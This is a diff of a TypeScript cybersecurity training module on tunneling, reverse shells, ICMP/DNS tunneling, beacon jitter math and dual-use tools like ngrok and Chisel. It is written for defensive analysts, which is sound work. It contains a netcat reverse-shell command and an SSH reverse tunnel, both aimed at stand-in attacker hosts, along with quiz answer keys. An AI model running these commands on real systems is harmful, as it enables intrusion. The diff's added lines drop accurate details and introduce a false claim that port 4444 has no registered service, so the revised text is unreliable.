@@ -35,7 +35,7 @@ const plinkReverseTunnelEvent: TelemetryEvent = {
   dst_port: 443,
   protocol: "tcp",
   description:
-    "Sysmon process creation (Event ID 1): plink.exe started on SRV-APP12 by SOLVIX\\svc_report",
+    "SRV-APP12 spawned plink.exe, the PuTTY command-line SSH client, from a user Temp folder with a remote port-forward command line",
   raw: {
     "winlog.event_id": 1,
     "winlog.provider_name": "Microsoft-Windows-Sysmon",
@@ -92,11 +92,11 @@ const tunnelingRoom = {
   id: "tunneling-c2-channels",
   title: "Tunneling, Proxies & C2 Channels",
   description:
-    "Learn to recognize covert channels the way an analyst investigating an active intrusion actually finds them: SSH local/remote/dynamic port forwarding and what each looks like on the wire, SOCKS proxy pivoting and reverse shells, ICMP and DNS tunneling mechanics, the exact math behind HTTP(S) beacon interval and jitter, and why attackers increasingly prefer legitimate, signed dual-use tools like ngrok, Chisel, and plink over custom malware, plus how to tell dual-use tooling used maliciously apart from the same tools used for approved IT work, and how to scope, contain and document a confirmed channel.",
+    "Learn to recognize covert channels the way an analyst investigating an active intrusion actually finds them: SSH local/remote/dynamic port forwarding and what each looks like on the wire, SOCKS proxy pivoting and reverse shells, ICMP and DNS tunneling mechanics, the exact math behind HTTP(S) beacon interval and jitter, and why attackers increasingly prefer legitimate, signed living-off-the-land tools like ngrok, Chisel, and plink over custom malware, plus how to tell dual-use tooling used maliciously apart from the same tools used for approved IT work.",
   difficulty: "advanced" as const,
   category: "Network Security" as const,
-  estimatedMinutes: 85,
-  xp: 495,
+  estimatedMinutes: 70,
+  xp: 410,
   icon: "🕳️",
   prerequisites: ["tcpip-deep-dive", "dns-deep-dive"],
   tasks: [
@@ -110,11 +110,9 @@ const tunnelingRoom = {
         `**Local forwarding (-L): expose a REMOTE service on your LOCAL machine**\n\n` +
         `ssh -L 8080:internal-app:80 jumpbox.example.com opens a listener on YOUR local port 8080; anything you connect to on 127.0.0.1:8080 gets tunneled, through the SSH connection to jumpbox.example.com, and from there out to internal-app:80. This is the common, everyday, legitimate use case: reaching an internal service you don't have direct network access to, via an SSH jump host you do have access to. Attackers use it too: most often to reach an internal target from their own attacker-controlled machine, tunneling through a single compromised host that DOES have the needed network access.\n\n` +
         `**Remote forwarding (-R): expose a LOCAL service to the REMOTE side, the dangerous direction**\n\n` +
-        `ssh -R 3389:127.0.0.1:3389 attacker-server.com does the reverse: it opens a listener on the REMOTE machine (attacker-server.com), and anything connecting to THAT remote listener gets tunneled back through the SSH connection to 127.0.0.1:3389 on the machine that initiated the SSH connection. This is exactly the mechanism behind a reverse tunnel: an internal, compromised host initiates a normal-looking OUTBOUND SSH connection (which most firewalls permit far more readily than inbound connections), and once established, the attacker, sitting on the remote end, can now reach back INTO the internal network through that tunnel, entirely bypassing whatever inbound firewall rules would otherwise have blocked them. The internal host effectively phones home and hands the attacker a door that opens from the outside, without ever requiring an inbound connection to be allowed anywhere. (By default OpenSSH binds that remote listener to the server's own loopback address unless the server allows GatewayPorts, which makes no difference here: the attacker owns the server and connects from it.)\n\n` +
+        `ssh -R 3389:127.0.0.1:3389 attacker-server.com does the reverse: it opens a listener on the REMOTE machine (attacker-server.com), and anything connecting to THAT remote listener gets tunneled back through the SSH connection to 127.0.0.1:3389 on the machine that initiated the SSH connection. This is exactly the mechanism behind a reverse tunnel: an internal, compromised host initiates a normal-looking OUTBOUND SSH connection (which most firewalls permit far more readily than inbound connections), and once established, the attacker, sitting on the remote end, can now reach back INTO the internal network through that tunnel, entirely bypassing whatever inbound firewall rules would otherwise have blocked them. The internal host effectively phones home and hands the attacker a door that opens from the outside, without ever requiring an inbound connection to be allowed anywhere.\n\n` +
         `**Dynamic forwarding (-D): turn the SSH client into a full SOCKS proxy**\n\n` +
-        `ssh -D 1080 jumpbox.example.com doesn't forward one specific port at all. It turns the local machine into a SOCKS proxy listening on port 1080. Any application configured to use that SOCKS proxy (a browser, or, notably, an attacker's own tooling configured via proxychains) can now reach ANY TCP destination reachable from jumpbox.example.com, on ANY port, all tunneled through the single encrypted SSH connection (OpenSSH's SOCKS proxy relays TCP connections only, not UDP). This is the most flexible and most dangerous mode for an attacker pivoting through a compromised host: rather than pre-selecting one specific service to forward (as -L and -R normally require), -D gives them arbitrary, on-demand access to the entire network reachable from that pivot point. Since OpenSSH 7.6 there is also a reverse version of it: -R with only a port number (ssh -R 1080 attacker-server.com) opens a SOCKS proxy on the ATTACKER's server whose traffic exits from the internal host, the dynamic equivalent of a reverse tunnel.\n\n` +
-        `**Where these commands come from on Windows**\n\n` +
-        `Windows 10 (version 1809) and Windows Server 2019 onward ship the OpenSSH client as C:\\Windows\\System32\\OpenSSH\\ssh.exe, so the same -L/-R/-D syntax can appear in a native Windows binary, not only in third-party tools such as plink. In MITRE ATT&CK, carrying one protocol inside another like this is Protocol Tunneling (T1572).\n\n` +
+        `ssh -D 1080 jumpbox.example.com doesn't forward one specific port at all. It turns the local machine into a SOCKS proxy listening on port 1080. Any application configured to use that SOCKS proxy (a browser, or, notably, an attacker's own tooling configured via proxychains) can now reach ANY destination reachable from jumpbox.example.com, on ANY port, all tunneled through the single encrypted SSH connection. This is the most flexible and most dangerous mode for an attacker pivoting through a compromised host: rather than pre-selecting one specific service to forward (as -L and -R require), -D gives them arbitrary, on-demand access to the entire network reachable from that pivot point.\n\n` +
         `**Why the network evidence looks almost identical regardless of forwarding mode**\n\n` +
         `From a pure flow-log perspective, all three modes look like exactly what they are at the transport layer: one long-lived, encrypted TCP connection on port 22 (or, as covered later in this room, sometimes a non-standard port chosen deliberately to blend in). The forwarding TYPE and DIRECTION are not visible in the flow record at all. This is exactly why process-creation telemetry (the actual command line used to invoke ssh or plink, which explicitly states -L, -R, or -D and the exact ports involved) is essential to fully understand what a suspicious long-lived SSH connection is actually being used for.`,
       codeExample:
@@ -167,13 +165,13 @@ const tunnelingRoom = {
       heading: "SOCKS Proxies and Reverse Shells",
       content:
         `**SOCKS: a protocol-agnostic relay**\n\n` +
-        `A SOCKS proxy (versions 4 and 5, with 5 adding authentication and UDP support) is deliberately simple: a client connects to the SOCKS proxy and requests "relay my traffic to destination X, port Y", the proxy then relays raw TCP (or, in SOCKS5, UDP) bytes back and forth, with no understanding of or interest in what protocol is actually being carried inside. This protocol-agnosticism is exactly what makes SOCKS so useful for pivoting: once an attacker has a SOCKS proxy running through a compromised host (via SSH -D, as covered above, or via a dedicated proxy tool), they can point ANY of their own tooling (a port scanner, a web browser, an exploitation framework, credential-harvesting tools) at that SOCKS proxy and have it reach deep into the target's internal network as if the attacker's own machine were sitting inside it, without needing to write any custom malware to do so. Tools like proxychains transparently redirect an existing application's network traffic through a configured SOCKS proxy without that application needing any built-in proxy support at all. One limit to remember: the SOCKS5 protocol defines UDP relaying, but the SOCKS proxy built into the OpenSSH client relays TCP only, so a scan pushed through ssh -D is a TCP connect scan, never a UDP or raw-packet scan. MITRE ATT&CK files a relay through one of the victim's own hosts as Proxy: Internal Proxy (T1090.001).\n\n` +
+        `A SOCKS proxy (versions 4 and 5, with 5 adding authentication and UDP support) is deliberately simple: a client connects to the SOCKS proxy and requests "relay my traffic to destination X, port Y", the proxy then relays raw TCP (or, in SOCKS5, UDP) bytes back and forth, with no understanding of or interest in what protocol is actually being carried inside. This protocol-agnosticism is exactly what makes SOCKS so useful for pivoting: once an attacker has a SOCKS proxy running through a compromised host (via SSH -D, as covered above, or via a dedicated proxy tool), they can point ANY of their own tooling (a port scanner, a web browser, an exploitation framework, credential-harvesting tools) at that SOCKS proxy and have it reach deep into the target's internal network as if the attacker's own machine were sitting inside it, without needing to write any custom malware to do so. Tools like proxychains transparently redirect an existing application's network traffic through a configured SOCKS proxy without that application needing any built-in proxy support at all.\n\n` +
         `**Chaining SOCKS proxies for multi-hop pivoting**\n\n` +
-        `Attackers frequently chain multiple SOCKS hops together (compromise host A, pivot via A's SOCKS proxy to reach and compromise host B deeper in the network, establish a SECOND SOCKS proxy through B, and so on). Each additional hop makes the traffic's true origin progressively harder to trace purely from network logs at any single point, since each hop only ever sees its own immediate predecessor and successor, not the full chain. ATT&CK calls this Multi-hop Proxy (T1090.003).\n\n` +
+        `Attackers frequently chain multiple SOCKS hops together (compromise host A, pivot via A's SOCKS proxy to reach and compromise host B deeper in the network, establish a SECOND SOCKS proxy through B, and so on). Each additional hop makes the traffic's true origin progressively harder to trace purely from network logs at any single point, since each hop only ever sees its own immediate predecessor and successor, not the full chain.\n\n` +
         `**Bind shells vs. reverse shells**\n\n` +
         `A shell payload gives an attacker interactive command execution on a compromised host, and comes in two structural flavors. A **bind shell** has the compromised host itself open a listening port and wait for the attacker to connect INTO it. Simple, but requires an INBOUND connection to reach the victim, which most modern firewalls (correctly configured to block unsolicited inbound traffic) will block outright, making bind shells largely impractical against any reasonably defended target. A **reverse shell** flips the direction: the compromised host itself initiates an OUTBOUND connection back to attacker-controlled infrastructure, which then hands back an interactive shell over that connection. Because outbound connections are, in most environments, permitted far more liberally than inbound ones (users need to browse the web, applications need to reach APIs), reverse shells are overwhelmingly the more common and more successful approach. This is the exact same "outbound is trusted more than inbound" asymmetry that makes SSH remote forwarding (-R) so effective, and it's the single most consistent theme across nearly every tunneling and pivoting technique in this room.\n\n` +
         `**What this looks like in a flow log**\n\n` +
-        `A classic netcat-style reverse shell (nc -e /bin/bash attacker_ip 4444 on the netcat builds that still have -e, or the fileless PowerShell/Python equivalents that avoid a literal -e flag but accomplish the same thing) produces a connection with a distinctive shape: NOT a clean, protocol-conforming HTTP/TLS/SSH negotiation at all if run in its simplest raw-netcat form, a genuinely interactive, irregular byte pattern over time (bursts corresponding to individual commands typed and their output, rather than either a clean request/response HTTP shape or a steady, high-volume bulk-transfer shape), and, often, a connection to a port that nothing legitimate in the environment uses. 4444 is the long-standing default listener port (LPORT) of Metasploit payloads. IANA does list it for krb524, an obsolete Kerberos 5-to-4 ticket translator, but no modern enterprise runs that, so an outbound connection to 4444 has no business explanation. ATT&CK maps a raw TCP shell like this to Non-Application Layer Protocol (T1095), and any service on a port other than its usual one (a shell on 4444, SSH on 443) to Non-Standard Port (T1571). More sophisticated reverse shells deliberately wrap themselves in legitimate-looking HTTPS traffic specifically to blend in and avoid exactly this kind of raw-protocol fingerprinting, which is exactly why the beaconing-math and living-off-the-land-tooling readings later in this room matter as much as recognizing a raw, unencrypted reverse shell does.`,
+        `A classic netcat-style reverse shell (nc -e /bin/bash attacker_ip 4444, or the fileless PowerShell/Python equivalents that avoid a literal -e flag but accomplish the same thing) produces a connection with a distinctive shape: NOT a clean, protocol-conforming HTTP/TLS/SSH negotiation at all if run in its simplest raw-netcat form, a genuinely interactive, irregular byte pattern over time (bursts corresponding to individual commands typed and their output, rather than either a clean request/response HTTP shape or a steady, high-volume bulk-transfer shape), and, often, a listener/connection on a port with no legitimate registered service association at all (4444 is the long-standing, extremely well-known default Metasploit listener port specifically because it was never claimed by any standard service). More sophisticated reverse shells deliberately wrap themselves in legitimate-looking HTTPS traffic specifically to blend in and avoid exactly this kind of raw-protocol fingerprinting, which is exactly why the beaconing-math and living-off-the-land-tooling readings later in this room matter as much as recognizing a raw, unencrypted reverse shell does.`,
       codeExample:
         "BIND SHELL vs REVERSE SHELL -- WHY REVERSE WINS\n" +
         "=======================================================\n" +
@@ -191,8 +189,8 @@ const tunnelingRoom = {
         "=======================================================\n" +
         "Victim runs:  nc -e /bin/bash attacker_ip 4444\n" +
         "  -> outbound TCP to attacker_ip:4444\n" +
-        "  -> port 4444: Metasploit's default LPORT; its IANA\n" +
-        "     entry (krb524) is obsolete, nothing modern uses it\n" +
+        "  -> port 4444 has no standard registered service\n" +
+        "     (the long-standing default Metasploit listener port)\n" +
         "  -> irregular, bursty byte pattern (interactive typing +\n" +
         "     command output), not a clean protocol negotiation\n" +
         "     or steady bulk-transfer shape\n" +
@@ -211,31 +209,13 @@ const tunnelingRoom = {
         options: [
           "A reverse shell encrypts its session by default, while a bind shell sends commands in cleartext that IDS can flag",
           "The victim dials out, and egress traffic is filtered far more loosely than unsolicited inbound connections",
-          "A reverse shell listens on an unusual port such as 4444, which the firewall has no rule to inspect",
+          "A reverse shell listens on an unregistered port such as 4444, which the firewall has no rule to inspect",
           "A bind shell needs the attacker's own machine to accept inbound connections, which their NAT router blocks",
         ],
         answer: 1,
         explanation:
-          "A reverse shell has the compromised host initiate an outbound connection, and most environments permit outbound traffic far more liberally than unsolicited inbound traffic: the same asymmetry that makes SSH -R effective. Encryption is not what separates the two: a raw netcat reverse shell is unencrypted. Port 4444 is the attacker's listener, not something the victim listens on, and an unusual port does not slip past a firewall. The NAT option reverses the direction: a bind shell needs the VICTIM to accept an inbound connection, which is exactly what the corporate firewall blocks.",
+          "A reverse shell has the compromised host initiate an outbound connection, and most environments permit outbound traffic far more liberally than unsolicited inbound traffic: the same asymmetry that makes SSH -R effective. Encryption is not what separates the two: a raw netcat reverse shell is unencrypted. Port 4444 is the attacker's listener, not something the victim listens on, and an unregistered port does not slip past a firewall. The NAT option reverses the direction: a bind shell needs the VICTIM to accept an inbound connection, which is exactly what the corporate firewall blocks.",
       },
-    },
-
-    // ── Question 1 ────────────────────────────────────────────────────────
-    {
-      type: "question" as const,
-      id: "tunnel-q1",
-      question:
-        "An internal server initiates an outbound SSH connection to an external host using the -R flag with arguments forwarding its own local port 3389. What does this specific flag and direction indicate, and why is it considered more dangerous than a -L forward?",
-      options: [
-        "-R is a dynamic SOCKS proxy that lets the internal server reach out through the external host, no riskier than -L",
-        "-R opens a listener on the external host that leads back to this server's port 3389: inbound reach over an outbound link",
-        "-R forwards the external host's own local port into the internal network, so it only matters if the server listens",
-        "-R tunnels only port 3389 outbound in a restricted relay mode; the danger is data leaving, not access coming in",
-      ],
-      answer: 1,
-      explanation:
-        "As covered in Reading 1, -R creates a listener on the remote/external side that tunnels back to a local service on the machine that initiated the connection, so an external party reaches INTO the internal network through a tunnel that was only ever an OUTBOUND connection, sidestepping inbound firewall rules. -L, by contrast, only lets the initiating machine reach OUT through the remote side. The SOCKS-proxy option describes -D, and the stem names a fixed local port (3389), so this is not -R's SOCKS form either, which would anyway point inward, not outward. The option claiming the external host's own port is forwarded inward reverses which side's service is exposed. The 'restricted relay, data leaving' option misses the point: the forwarded service is reached from outside, so the risk is inbound access, not just outbound data.",
-      xp: 25,
     },
 
     // ── Reading 3: ICMP/DNS tunneling mechanics ────────────────────────────────
@@ -246,19 +226,19 @@ const tunnelingRoom = {
       content:
         `You've already covered DNS tunneling's statistical detection in depth in an earlier room; here the focus is the mechanics of ICMP tunneling specifically, paired with a throughput-focused recap of DNS tunneling's practical constraints. Both matter because they represent the two most heavily "allowed by default" protocols an attacker can hide inside.\n\n` +
         `**ICMP tunneling: hiding data in a protocol built for control messages, not payload**\n\n` +
-        `ICMP echo request/reply (what ping uses) technically permits an arbitrary-length, arbitrary-content data payload in each packet. Normally, this payload is just fixed padding bytes (a standard Windows ping sends a recognizable, repeating 32-byte alphabetic pattern; a standard Linux ping sends 56 data bytes: an 8-byte timestamp followed by a recognizable incrementing 48-byte pattern, so only those first timestamp bytes change from packet to packet) that no real application ever reads or cares about. ICMP tunneling tools (icmpsh, ptunnel, and similar) abuse exactly this unused capacity: they encode arbitrary command/response data (shell commands, file contents, C2 instructions) directly inside that payload field, using ICMP echo request/reply pairs as the transport, riding on a protocol that firewalls very commonly permit outbound by default for basic network diagnostics. Because ICMP has no ports and no application layer, MITRE ATT&CK files this under Non-Application Layer Protocol (T1095).\n\n` +
+        `ICMP echo request/reply (what ping uses) technically permits an arbitrary-length, arbitrary-content data payload in each packet. Normally, this payload is just fixed padding bytes (a standard Windows ping sends a recognizable, repeating 32-byte alphabetic pattern; a standard Linux/Unix ping sends a recognizable, incrementing 48- or 56-byte pattern) that no real application ever reads or cares about. ICMP tunneling tools (icmpsh, ptunnel, and similar) abuse exactly this unused capacity: they encode arbitrary command/response data (shell commands, file contents, C2 instructions) directly inside that payload field, using ICMP echo request/reply pairs as the transport, riding on a protocol that firewalls very commonly permit outbound by default for basic network diagnostics.\n\n` +
         `**Detecting ICMP tunneling**\n\n` +
-        `The tells are almost entirely about the payload not matching what a real ping utility ever produces: payload SIZE that's unusually large (real diagnostic pings rarely exceed 64-128 bytes; tunneled data pushing payloads toward the practical maximum, or showing wildly inconsistent sizes packet to packet as different amounts of data get sent, is anomalous; an administrator testing path MTU does send large pings, but with the same fixed filler pattern in every packet) or payload CONTENT that doesn't match either OS's standard fixed pattern at all (real ping payloads are boringly predictable and repetitive, apart from Linux's leading timestamp; tunneled data looks like arbitrary binary or text, changing meaningfully between packets rather than repeating). An unusually HIGH RATE of ICMP echo requests to a single external host (far beyond what any legitimate connectivity troubleshooting session would ever generate) is the other major signal, mirroring the volume-based logic from DNS tunneling detection.\n\n` +
+        `The tells are almost entirely about the payload not matching what a real ping utility ever produces: payload SIZE that's unusually large (real diagnostic pings rarely exceed 64-128 bytes; tunneled data pushing payloads toward the practical maximum, or showing wildly inconsistent sizes packet to packet as different amounts of data get sent, is anomalous) or payload CONTENT that doesn't match either OS's standard fixed pattern at all (real ping payloads are boringly predictable and repetitive; tunneled data looks like arbitrary binary or text, changing meaningfully between packets rather than repeating). An unusually HIGH RATE of ICMP echo requests to a single external host (far beyond what any legitimate connectivity troubleshooting session would ever generate) is the other major signal, mirroring the volume-based logic from DNS tunneling detection.\n\n` +
         `**DNS tunneling: throughput constraints worth internalizing**\n\n` +
-        `Beyond the statistical signals covered previously, it's worth understanding WHY DNS tunneling behaves the way it does: each individual DNS query/response round trip carries only a small amount of usable payload (tens of bytes to perhaps a couple hundred, depending on record type and encoding overhead), and each round trip has real latency (a full resolution can take anywhere from single-digit milliseconds to significantly longer depending on the path). This means DNS tunneling's realistic sustained throughput ranges from a few kilobytes per minute for cautious low-and-slow implants up to several kilobytes per second for tuned tools such as iodine using large NULL records, at best on the order of tens of megabytes per hour, genuinely usable for C2 command-and-control traffic (small commands, small responses) and slow, patient data exfiltration, but fundamentally impractical for moving large files quickly. This throughput ceiling is itself a useful piece of context: if you're investigating a suspected large, fast data exfiltration event, DNS tunneling is a poor mechanical fit for that specific characteristic, and the investigation should look elsewhere (a large upload-shaped TCP flow, or a fast HTTP(S) POST), while a slow, patient, long-duration low-volume channel is exactly DNS tunneling's comfort zone. ATT&CK maps C2 carried in DNS queries and answers to Application Layer Protocol: DNS (T1071.004).`,
+        `Beyond the statistical signals covered previously, it's worth understanding WHY DNS tunneling behaves the way it does: each individual DNS query/response round trip carries only a small amount of usable payload (tens of bytes to perhaps a couple hundred, depending on record type and encoding overhead), and each round trip has real latency (a full resolution can take anywhere from single-digit milliseconds to significantly longer depending on the path). This means DNS tunneling's realistic sustained throughput ranges from a few kilobytes per minute for cautious low-and-slow implants up to several kilobytes per second for tuned tools such as iodine using large NULL records, at best on the order of tens of megabytes per hour, genuinely usable for C2 command-and-control traffic (small commands, small responses) and slow, patient data exfiltration, but fundamentally impractical for moving large files quickly. This throughput ceiling is itself a useful piece of context: if you're investigating a suspected large, fast data exfiltration event, DNS tunneling is a poor mechanical fit for that specific characteristic, and the investigation should look elsewhere (a large upload-shaped TCP flow, or a fast HTTP(S) POST), while a slow, patient, long-duration low-volume channel is exactly DNS tunneling's comfort zone.`,
       codeExample:
         "STANDARD PING PAYLOADS vs TUNNELED ICMP PAYLOADS\n" +
         "=======================================================\n" +
         "Windows ping default payload (32 bytes, repeating):\n" +
         "  abcdefghijklmnopqrstuvwabcdefghi\n" +
         "\n" +
-        "Linux ping default payload (56 bytes): 8-byte timestamp,\n" +
-        "  then the incrementing bytes 0x08, 0x09, 0x0a, ... 0x37\n" +
+        "Linux/Unix ping default payload (48-56 bytes, incrementing\n" +
+        "  byte sequence 0x08, 0x09, 0x0a, 0x0b, ...)\n" +
         "\n" +
         "Tunneled ICMP payload:\n" +
         "  Variable size packet-to-packet, arbitrary binary/text\n" +
@@ -291,19 +271,17 @@ const tunnelingRoom = {
       id: "tunnel-r4",
       heading: "HTTP(S) Beaconing Math: Interval, Jitter, and Statistical Detection",
       content:
-        `Command-and-control frameworks almost universally use a "sleep and check in" model rather than maintaining a constant, always-on connection, both to minimize their network footprint and to reduce the chance of looking like a persistent, actively-monitored session. Over HTTP(S) this is Application Layer Protocol: Web Protocols (T1071.001) in MITRE ATT&CK, and the TLS wrapped around it is Encrypted Channel (T1573). Understanding the exact math behind this lets you detect it even when the operator has deliberately tried to hide the pattern.\n\n` +
+        `Command-and-control frameworks almost universally use a "sleep and check in" model rather than maintaining a constant, always-on connection. Both to minimize their network footprint and to reduce the chance of looking like a persistent, actively-monitored session. Understanding the exact math behind this lets you detect it even when the operator has deliberately tried to hide the pattern.\n\n` +
         `**Interval: the base sleep time**\n\n` +
-        `The beacon's operator configures a **sleep interval** (commonly measured in seconds): how long the implant waits between each check-in to its C2 server. A naive, un-jittered beacon checking in every exactly 60 seconds produces a trivially detectable pattern: plot the time gaps between successive connections to the same destination, and every single gap is (as close to) precisely 60 seconds as network latency allows.\n\n` +
+        `The beacon's operator configures a **sleep interval** (commonly measured in seconds). How long the implant waits between each check-in to its C2 server. A naive, un-jittered beacon checking in every exactly 60 seconds produces a trivially detectable pattern: plot the time gaps between successive connections to the same destination, and every single gap is (as close to) precisely 60 seconds as network latency allows.\n\n` +
         `**Jitter: randomizing within a band, not eliminating the pattern**\n\n` +
         `**Jitter** is configured as a percentage that randomizes the actual sleep time around the base interval: a 60-second interval with 20% jitter means each individual sleep is randomly chosen somewhere between 48 seconds (60 minus 20%) and 72 seconds (60 plus 20%), a different random value each time. (Jitter semantics vary by framework: this room uses the symmetric ± convention, but Cobalt Strike, for example, only subtracts (sleep 60 with 20% jitter gives 48–60 seconds) and some frameworks add a random delay on top of the base instead, so confirm the convention before computing a band.) This defeats naive "are all the gaps EXACTLY 60 seconds" detection, but it does NOT make the beacon's timing look like genuinely random human activity, because jitter only randomizes WITHIN a fixed, bounded band. Every single gap, no matter how the random draw comes out, still falls somewhere between 48 and 72 seconds. It can never be 10 seconds, and it can never be 300 seconds, the way genuinely unstructured human browsing behavior naturally would produce.\n\n` +
         `**The statistical detection: deltas cluster in a band, real activity doesn't**\n\n` +
-        `An analyst (or an automated tool like RITA, built specifically for this over Zeek logs) computes the **inter-arrival deltas** (the time gap between each successive connection from one host to the same destination) across a large enough sample, then looks at the SHAPE of that distribution. A beacon with interval=60/jitter=20% produces deltas that are tightly and evenly clustered somewhere in the 48-72 second band, session after session, hour after hour, essentially indefinitely, for as long as the implant stays alive. Ordinary human-driven traffic to any single destination (even a site someone visits very habitually) does not produce this kind of persistent, bounded clustering; human timing is influenced by actual activity, breaks, meetings, and simple inattention, producing deltas that are far more varied and don't sit in one tight, unchanging band indefinitely.\n\n` +
+        `An analyst (or an automated tool like RITA, built specifically for this) computes the **inter-arrival deltas** (the time gap between each successive connection from one host to the same destination) across a large enough sample, then looks at the SHAPE of that distribution. A beacon with interval=60/jitter=20% produces deltas that are tightly and evenly clustered somewhere in the 48-72 second band, session after session, hour after hour, essentially indefinitely, for as long as the implant stays alive. Ordinary human-driven traffic to any single destination (even a site someone visits very habitually) does not produce this kind of persistent, bounded clustering; human timing is influenced by actual activity, breaks, meetings, and simple inattention, producing deltas that are far more varied and don't sit in one tight, unchanging band indefinitely.\n\n` +
         `**Worked example**\n\n` +
         `Given ten observed connection timestamps to one destination, compute the nine gaps between them. If every one of those nine gaps falls between 48 and 72 seconds, with no gap dramatically outside that range, and this pattern continues consistently across a much longer observation window (hours, not just ten samples), that is a very high-confidence beacon signature, because the ONLY realistic non-malicious explanation for that kind of sustained, bounded regularity is some form of legitimate, genuinely scheduled automated task (an update checker, a telemetry client, a license-validation service), which is exactly why destination reputation and process attribution (covered in the TLS room's C2 detection reading) still matter as the final piece of the puzzle even after the timing math checks out.\n\n` +
         `**Beacon "score" as a concept**\n\n` +
-        `Detection tools formalize this into a beacon score: a composite metric weighing how tightly deltas cluster (low variance relative to the mean = higher score), how many repetitions have been observed (more repetitions = more statistical confidence), and how consistent the data-size-per-connection is (as covered in the TLS room). A single pair of connections 60 seconds apart proves nothing; dozens of connections sustaining a tight, bounded interval over hours is what turns a coincidence into a confident detection. Real tools use robust statistics for the "how tight" part (RITA, for example, measures the skew of the gaps and their median absolute deviation, so one outlier does not hide a beacon), but the idea is the same as a small standard deviation relative to the mean.\n\n` +
-        `**The observation window must outlast the sleep**\n\n` +
-        `A beacon can only be measured over many repetitions, so the window has to be many times longer than the sleep. A one-hour window shows about sixty check-ins of a 60-second beacon but only one or two of a 30-minute beacon, which is why low-and-slow implants are hunted over 24 hours or longer, not over the last hour.`,
+        `Detection tools formalize this into a beacon score: a composite metric weighing how tightly deltas cluster (low variance relative to the mean = higher score), how many repetitions have been observed (more repetitions = more statistical confidence), and how consistent the data-size-per-connection is (as covered in the TLS room). A single pair of connections 60 seconds apart proves nothing; dozens of connections sustaining a tight, bounded interval over hours is what turns a coincidence into a confident detection.`,
       codeExample:
         "WORKED EXAMPLE: interval=60s, jitter=20% -> band = 48-72s\n" +
         "=======================================================\n" +
@@ -348,37 +326,19 @@ const tunnelingRoom = {
       },
     },
 
-    // ── Question 2 ────────────────────────────────────────────────────────
-    {
-      type: "question" as const,
-      id: "tunnel-q2",
-      question:
-        "A C2 beacon is configured with a 90-second interval and 30% jitter, applied symmetrically (± around the base). Which observed inter-arrival delta falls OUTSIDE the expected jittered band, and therefore does not fit this beacon profile on its own?",
-      options: [
-        "66 seconds",
-        "114 seconds",
-        "60 seconds",
-        "88 seconds",
-      ],
-      answer: 2,
-      explanation:
-        "With a 90-second interval and symmetric 30% jitter, the band runs from 90 minus 27 (63 seconds) to 90 plus 27 (117 seconds). 66 and 114 seconds sit near the edges but inside the band, and 88 seconds is close to the base, so all three fit. 60 seconds is just below the 63-second floor. Reading 30% as ±30 seconds (a 60–120 band) would wrongly accept it. A gap outside the band means either it came from a different cause or the beacon's real configuration differs from what is assumed.",
-      xp: 30,
-    },
-
     // ── Reading 5: LOLBin tunneling tools ────────────────────────────────────
     {
       type: "reading" as const,
       id: "tunnel-r5",
-      heading: "Dual-Use Tunneling Tools: ngrok, Chisel, and plink",
+      heading: "Living-off-the-Land Tunneling Tools: ngrok, Chisel, and plink",
       content:
-        `Attackers increasingly favor legitimate, often digitally-signed, publicly-available tools over custom-built malware for exactly one reason: signature-based antivirus and simplistic allowlisting are far less likely to flag a well-known, legitimately-signed utility, and even when analysts do notice the tool running, its presence alone is genuinely ambiguous. Plenty of legitimate IT and developer workflows use these same tools. Strictly, these three are third-party tools the attacker brings along, not "living-off-the-land" binaries: that term means tools the operating system already ships, such as Windows' own ssh.exe or netsh interface portproxy, which can forward ports with no download at all. Detection logic is the same for both groups.\n\n` +
+        `Attackers increasingly favor legitimate, often digitally-signed, publicly-available tools over custom-built malware for exactly one reason: signature-based antivirus and simplistic allowlisting are far less likely to flag a well-known, legitimately-signed utility, and even when analysts do notice the tool running, its presence alone is genuinely ambiguous. Plenty of legitimate IT and developer workflows use these same tools.\n\n` +
         `**ngrok: instant public tunnels via a trusted SaaS provider**\n\n` +
         `ngrok is a legitimate, widely-used developer tool that creates a public, internet-reachable HTTPS (or TCP) tunnel to a service running on a local/internal machine, entirely through ngrok's own cloud infrastructure: no port forwarding, no firewall changes, no public IP needed on the target's end at all. An attacker who has landed on an internal host can run the ngrok client to instantly expose an internal service (a web shell, an RDP session via a local proxy, a file share) to the public internet, or, in the other direction, establish an outbound tunnel back to infrastructure they control, entirely through what LOOKS like completely normal, legitimate SaaS traffic. The network fingerprint is distinctive once you know to look for it: TLS connections with an SNI matching ngrok's own domains (*.ngrok.io, *.ngrok-free.app, or a custom domain if the attacker has a paid ngrok plan), from a host that has no legitimate business reason to be reaching a consumer/developer tunneling SaaS product at all (a production database server, a domain controller, a finance file server) is a strong contextual anomaly, even though the traffic itself is genuinely encrypted, genuinely legitimate SaaS traffic from ngrok's own perspective.\n\n` +
         `**Chisel: a fast, Go-based TCP/UDP tunnel, often for SOCKS pivoting**\n\n` +
-        `Chisel is an open-source tool (also legitimately used by penetration testers and some IT teams) that creates a tunnel over HTTP, with the server and client both compiled as small, portable, single-file binaries, making it trivially easy to drop onto a compromised host with no installation and no dependencies. Chisel is very commonly paired specifically with SOCKS proxy functionality, letting an attacker stand up a full network pivot through a single dropped binary rather than needing SSH access (which requires valid credentials and an SSH server already running) at all. Its network fingerprint rides on HTTP/HTTPS, and while its default configuration has some recognizable characteristics (in a proxy or IDS that can see the HTTP layer, the session opens with a WebSocket upgrade request whose Sec-WebSocket-Protocol header carries the tool's protocol version string, with an SSH session running inside the WebSocket), operators increasingly customize these specifically to evade signature-based detection, which is exactly why behavioral signals (an unfamiliar, recently-dropped binary establishing a long-lived outbound connection with beacon-like or pivot-like traffic shape) matter more than static signatures for this tool specifically.\n\n` +
+        `Chisel is an open-source tool (also legitimately used by penetration testers and some IT teams) that creates a tunnel over HTTP, with the server and client both compiled as small, portable, single-file binaries, making it trivially easy to drop onto a compromised host with no installation and no dependencies. Chisel is very commonly paired specifically with SOCKS proxy functionality, letting an attacker stand up a full network pivot through a single dropped binary rather than needing SSH access (which requires valid credentials and an SSH server already running) at all. Its network fingerprint rides on HTTP/HTTPS, and while its default configuration has some recognizable characteristics (a specific banner/handshake behavior at the start of a session), operators increasingly customize these specifically to evade signature-based detection, which is exactly why behavioral signals (an unfamiliar, recently-dropped binary establishing a long-lived outbound connection with beacon-like or pivot-like traffic shape) matter more than static signatures for this tool specifically.\n\n` +
         `**plink.exe: PuTTY's command-line SSH client, and why EDR often trusts it by default**\n\n` +
